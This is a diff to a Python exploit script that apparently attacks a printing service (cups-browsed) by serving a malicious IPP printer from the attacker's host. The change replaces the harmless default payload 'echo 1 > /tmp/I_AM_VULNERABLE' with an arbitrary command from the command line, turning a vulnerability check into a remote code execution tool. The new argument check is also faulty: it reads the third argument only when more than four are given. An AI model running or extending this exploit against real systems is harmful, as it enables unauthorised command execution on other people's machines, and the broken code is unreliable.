@@ -185,14 +185,15 @@ def send_browsed_packet(ip, port, ipp_server_host, ipp_server_port):
 
 
 if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print("%s <LOCAL_HOST> <TARGET_HOST>" % sys.argv[0])
+    if len(sys.argv) < 3:
+        print("%s <LOCAL_HOST> <TARGET_HOST> <COMMAND>" % sys.argv[0])
         quit()
 
     SERVER_HOST = sys.argv[1]
     SERVER_PORT = 12345
 
-    command = "echo 1 > /tmp/I_AM_VULNERABLE"
+    command = sys.argv[3] if len(sys.argv) > 4 else "echo 1 > /tmp/I_AM_VULNERABLE"
+
 
     server = IPPServer((SERVER_HOST, SERVER_PORT),
                        IPPRequestHandler, MaliciousPrinter(command))
